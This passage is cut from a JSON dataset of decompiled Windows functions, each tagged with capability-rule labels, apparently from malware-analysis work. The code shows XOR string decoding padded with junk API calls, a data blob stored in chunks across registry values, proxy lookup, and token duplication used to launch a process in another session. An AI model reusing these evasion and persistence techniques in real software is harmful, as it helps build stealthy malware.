uVar8 = 1;\n        if (((pProxyConfig != 0) || (var_38h != 0)) &&\n           (iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  iVar6 != 0)) {\n            bVar10 = pProxyConfig != 0;\n            var_50h = 0;\n            uStack80 = 0;\n            uStack76 = 0;\n            var_54h = bVar10;\n            pAutoProxyOptions = bVar10;\n            if (var_38h != 0) {\n                pAutoProxyOptions = bVar10 | 2;\n                var_50h = var_38h;\n            }\n            var_44h = 1;\n            puVar9 = &pProxyInfo;\n            for (iVar7 = 4; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar6, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar7 != 0) && (psz2 != 0)) {\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n                pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                if (var_8h != 0) {\n                    (*pcVar2)(var_8h);\n                }\n                goto code_r0x00404806;\n            }\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n            pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_8h != 0) {\n                (*pcVar2)(var_8h);\n            }\n        }\n        if (var_34h != 0) {\n            if (var_30h == 0) {\ncode_r0x0040468a:\n                iVar6 = var_34h;\n                iVar7 = fcn.0040b0e5();\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar7 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar6);\n                    goto code_r0x00404806;\n                }\n                pProxyInfo = 0x6845562f;\n                psz2 = 0x31264719;\n                var_8h = 0x567d6d1b;\n                var_4h._0_2_ = 0x6831;\n                var_1ch = 0x68315647;\n                var_18h._0_1_ = 0x6d;\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                var_14h = 0;\n                var_28h = &pProxyInfo - iVar6;\n                var_40h = 5;\n                pszSrch = iVar6;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                    if (iVar7 != 0xd569ae) {\n                        *(var_14h + iVar6) = *(&var_1ch + var_14h % var_40h) ^ (var_14h + iVar6)[var_28h];\n                    }\n                    var_14h = var_14h + 1;\n                } while (var_14h < 0xe);\n                pProxyInfo = 0x632c615a;\n                psz2 = 0x58113244;\n                var_8h = 0x61323010;\n                var_1ch = 0x63586132;\n                var_18h._0_1_ = 0x30;\n                uVar8 = (*pcVar2)(8, 0x19);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                iVar7 = 0;\n                var_28h = &pProxyInfo - iVar6;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                    iVar3 = pszSrch;\n                    if (iVar4 != 0x64e9cc) {\n                        *(iVar7 + iVar6) = *(&var_1ch + iVar7 % var_40h) ^ (iVar7 + iVar6)[&pProxyInfo - iVar6];\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < 0xc);\n                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, pszSrch);\n                pszSrch = iVar7 == lpcwszUrl;\n                var_14h = 0;\n                lpcwszUrl = fcn.0040b10b(&var_14h);\n                uVar8 = 1;\n                while (pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap,  lpcwszUrl != 0) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar6);\n                    if ((pszSrch == (iVar7 == lpcwszUrl)) && (iVar7 = fcn.0040b0e5(),  iVar7 != 0)) {\n                        (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar7 + 2);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*pcVar2)(uVar5);\n                        goto code_r0x00404806;\n                    }\n                    lpcwszUrl = fcn.0040b10b(&var_14h);\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar2)(0, iVar3);\n                (*pcVar1)(uVar8);\n            }\n            else {\n                do {\n                    iVar6 = fcn.0040b10b(&var_14h);\n                    if (iVar6 == 0) goto code_r0x0040468a;\n                    iVar6 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar6);\n                } while (iVar6 == 0);\n            }\n        }\n    }\n    uVar8 = 0;\ncode_r0x00404806:\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_38h != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar2)(var_34h);\n    }\n    if (var_30h != 0) {\n        (*pcVar2)(var_30h);\n    }\n    return uVar8;\n}\n",
        "token_count": 2236
    },
    "00404a42": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00404a42(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint ARG_0;\n    uint lpValueName;\n    uint32_t var_58h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    int32_t hKey;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar var_38h;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    ushort var_27h;\n    uchar var_25h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = var_24h & 0xffffff00;\n    var_50h = param_1;\n    var_ch = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if ((((uVar2 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_58h = uVar2;\n        fcn.004048bb();\n        hKey = fcn.00404862(0x20006);\n        if (hKey != 0) {\n            var_44h = *param_1;\n            var_40h = 0x6f1d4b2b;\n            var_3ch = 0x4b28331b;\n            var_37h = 0x330c6f;\n            var_33h = 0x146f194b;\n            var_2fh = 0x114b2e33;\n            var_2bh = 0x2d33506f;\n            var_4ch = (((var_44h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar7 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_27h = 0x744b;\n            puVar7 = &lpValueName;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_20h = 6;\n            var_38h = 6;\n            var_25h = 0x6f;\n            var_8h = 0x6f744b49;\n            var_4h._0_2_ = 0x3375;\n            uVar1 = (*pcVar5)(8, 0x39);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_54h = iVar4;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n                if (iVar3 != 0x3b8f74) {\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_40h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, var_ch);\n            var_ch = 0;\n            var_18h = 0x6504507f;\n            var_14h = 0x77755a29;\n            var_10h = 0x505a7601;\n            var_8h = 0x6577505a;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x76);\n            var_20h = 5;\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            do {\n                uVar1 = (*pcVar5)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_1ch = &var_18h - iVar4;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                    if (iVar3 != 0xb4b13f) {\n                        *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0xc);\n                puVar7 = &lpValueName;\n                for (iVar6 = 0x40; iVar3 = var_ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_ch);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                var_ch = iVar3 + 1;\n            } while (var_ch < 0x32);\n            var_1ch = 0;\n            if (0 < var_4ch) {\n                var_ch = 0;\n                var_18h = 0x6504507f;\n                var_14h = 0x77755a29;\n                var_10h = 0x505a7601;\n                var_8h = 0x6577505a;\n                var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x76);\n                do {\n                    uVar1 = (*pcVar5)(8, 0x19);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar6 = 0;\n                    var_24h = &var_18h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                        if (iVar3 != 0xb4b13f) {\n                            *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0xc);\n                    puVar7 = &lpValueName;\n                    for (iVar6 = 0x40; iVar3 = var_1ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_1ch);\n                    iVar6 = 0x7d000;\n                    if (var_44h < 0x7d000) {\n                        iVar6 = var_44h;\n                    }\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_50h[1] + var_ch, iVar6);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    var_24h = -iVar6 & 0xffffff00U | 1 - (iVar6 != 0);\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    var_1ch = iVar3 + 1;\n                    var_ch = var_ch + 0x7d000;\n                    var_44h = var_44h + -0x7d000;\n                } while (var_1ch < var_4ch);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar1 = (*pcVar5)(0, var_54h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar2 = var_58h;\n        }\n        uVar1 = (*pcVar5)(0, uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return uVar2 & 0xffffff00 | var_24h & 0xff;\n}\n",
        "token_count": 2169
    },
    "00404d80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00404d80(int32_t *param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    code *pcVar11;\n    uint ARG_0;\n    uint lpValueName;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uchar *var_5ch;\n    uchar *var_58h;\n    int32_t *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uchar *var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_24h;\n    uint var_20h;\n    uchar *lpcbData;\n    uchar *var_18h;\n    int32_t hKey;\n    int32_t lpType;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_54h = param_1;\n    var_18h = param_2;\n    uVar2 = (*pcVar11)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_50h = iVar3;\n        fcn.004048bb();\n        var_64h = fcn.00404862(0x20019);\n        if (var_64h != 0) {\n            var_4ch = 0;\n            var_44h = 0x6f1d4b2b;\n            puVar9 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_40h = 0x4b28331b;\n            puVar9 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            lpType = 6;\n            var_3ch._0_1_ = 6;\n            stack0xffffffc1 = 0x330c6f;\n            var_37h = 0x146f194b;\n            var_33h = 0x114b2e33;\n            var_2fh = 0x2d33506f;\n            var_2bh._0_2_ = 0x744b;\n            var_2bh._2_1_ = 0x6f;\n            var_ch = 0x6f744b49;\n            var_8h._0_2_ = 0x3375;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar8 = 0;\n            var_68h = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n                if (iVar4 != 0x3b8f74) {\n                    *(iVar8 + iVar3) = *(&var_ch + iVar8 % lpType) ^ (iVar8 + iVar3)[&var_44h - iVar3];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar3, var_18h);\n            stack0xffffffd4 = 0x6504507f;\n            var_24h = 0x77755a29;\n            var_20h = 0x505a7601;\n            var_ch = 0x6577505a;\n            var_8h._0_2_ = CONCAT11(var_8h._1_1_, 0x76);\n            do {\n                pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puVar9 = &var_70h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                puVar9 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                lpType = &var_2bh + (3 - iVar3);\n                var_6ch = iVar3;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                    iVar4 = var_4ch;\n                    if (iVar5 != 0xb4b13f) {\n                        hKey = 5;\n                        *(iVar8 + iVar3) = *(&var_ch + iVar8 % 5) ^ (iVar8 + iVar3)[lpType];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar3, &ARG_0, var_4ch);\n                var_1h._0_1_ = '\\0';\n                var_48h = NULL;\n                var_4ch = iVar4 + 1;\n                var_18h = NULL;\n                hKey = fcn.00404862(0x20019);\n                param_1 = var_54h;\n                if (hKey != 0) {\n                    lpType = 3;\n                    lpcbData = NULL;\n                    var_5ch = NULL;\n                    iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    if (iVar8 == 0) {\n                        uVar2 = (*pcVar11)(8, lpcbData);\n                        var_58h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        puVar7 = var_5ch;\n                        puVar6 = var_5ch;\n                        if ((var_58h == NULL) ||\n                           (iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (hKey, &lpValueName, 0, &lpType, var_58h, &lpcbData),  puVar7 = var_58h, \n                           puVar6 = lpcbData,  iVar8 == 0)) {\n                            var_1h._0_1_ = '\\x01';\n                            var_48h = puVar7;\n                            var_18h = puVar6;\n                        }\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                    if (((var_1h != '\\0') && (var_48h != NULL)) && (var_18h != NULL)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*pcVar11)(8, var_18h);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*pcVar11)(0, param_1[1], var_18h + *param_1);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar6 = var_48h;\n                        puVar10 = iVar3 + *param_1;\n                        for (puVar7 = var_18h; puVar7 != NULL; puVar7 = puVar7 + -1) {\n                            *puVar10 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar10 = puVar10 + 1;\n                        }\n                        *param_1 = var_18h + *param_1;\n                        pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_48h);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        iVar3 = var_6ch;\n                    }\n                }\n                uVar2 = (*pcVar11)(0, iVar3);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_64h);\n            uVar2 = (*pcVar11)(0, var_68h);\n            (*pcVar1)(uVar2);\n            iVar3 = var_50h;\n        }\n        uVar2 = (*pcVar11)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2279
    },
    "00405296": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405296(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(8, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 369
    },
    "004056d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.004056d2(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    code *pcVar8;\n    uint lpApplicationName;\n    uint lpCommandLine;\n    int32_t var_a8h;\n    uint var_84h;\n    uint var_80h;\n    uint var_64h;\n    uint var_60h;\n    int32_t *var_5ch;\n    uint var_58h;\n    int32_t ProcessHandle;\n    uint TokenHandle;\n    uint var_4ch;\n    uint pSessionId;\n    int32_t var_44h;\n    uint hExistingToken;\n    uint pSid;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t var_8h;\n    uint hToken;\n    \n    var_ch._0_2_ = 0x1000;\n    piVar6 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar6 = 0;\n        piVar6 = piVar6 + 1;\n    }\n    puVar7 = &lpCommandLine;\n    var_5ch = param_2;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    pSessionId = 0;\n    puVar7 = &var_64h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_4ch = 0;\n    hToken = 0;\n    hExistingToken = 0;\n    var_8h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (ProcessHandle != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar4 != 0) {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar4 != 0) {\n                fcn.00405e5f();\n                iVar4 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar4 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar5 = 0;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_60h = 0x20;\n                        var_64h = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_64h, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_58h = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_58h, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_8h, hToken, 1);\n                    if (iVar4 == 0) {\n                        var_8h = 0;\n                    }\n                    else {\n                        var_4ch = 0x400;\n                    }\n                    lpCommandLine = 0x44;\n                    var_38h = 0x41224a34;\n                    var_34h = 0x4a30735f;\n                    var_30h = 0x7350413f;\n                    var_2ch = 0x41174a73;\n                    var_28h = 0x4a267355;\n                    var_24h = 0x7350412d;\n                    var_20h = 0x41274a36;\n                    var_1ch = 0x4a437345;\n                    var_18h = 0x414b4a43;\n                    var_14h._0_2_ = 0x7331;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    var_44h = &var_38h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                        if (iVar3 != 0xa033fa) {\n                            var_44h = 6;\n                            *(iVar5 + iVar4) = *(&var_18h + iVar5 % 6) ^ (iVar5 + iVar4)[&var_38h - iVar4];\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 0x20);\n                    var_80h._0_2_ = 0;\n                    var_84h = 1;\n                    var_a8h = iVar4;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpApplicationName, 0x4117b0, *0x41da98);\n                    param_2 = var_5ch;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, &lpApplicationName, 0, 0, 0, 0, var_4ch, var_8h, 0, &lpCommandLine, var_5ch);\n                    pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*param_2 != 0) {\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*param_2, 0x201eb, &TokenHandle);\n                        if (iVar5 != 0) {\n                            fcn.00405e5f();\n                            (*pcVar8)(TokenHandle);\n                        }\n                        (*pcVar8)(param_2[1]);\n                    }\n                    if (var_8h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_8h);\n                    }\n                    (*pcVar8)(hToken);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n                (*pcVar8)(hExistingToken);\n            }\n        }\n        (*pcVar8)(ProcessHandle);\n    }\n    return *param_2;\n}\n",
        "token_count": 1718
    },
    "00405979": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405979(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    uint32_t *puVar11;\n    int32_t iStack580;\n    uint32_t uStack576;\n    uint uStack572;\n    uint32_t uStack568;\n    uint32_t uStack564;\n    int32_t iStack552;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    uStack576 = 0;\n    iStack580 = 0;\n    puVar10 = auStack544;\n    for (iVar8 = 0x10; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar11 = &uStack568;\n    for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    piVar9 = &iStack528;\n    for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *piVar9 = 0;\n        piVar9 = piVar9 + 1;\n    }\n    if (*0x41dacc == 0) {\n        *0x41dd10 = fcn.004075ae();\n        uVar6 = *0x41dd18;\n        iVar8 = *0x41dd14;\n    }\n    else {\n        *0x41dd10 = fcn.004082fd();\n        iVar5 = fcn.0040dca6(&iStack580);\n        uVar6 = uStack576;\n        iVar8 = iStack580;\n        if (iVar5 != 0) goto code_r0x00405a32;\n    }\n  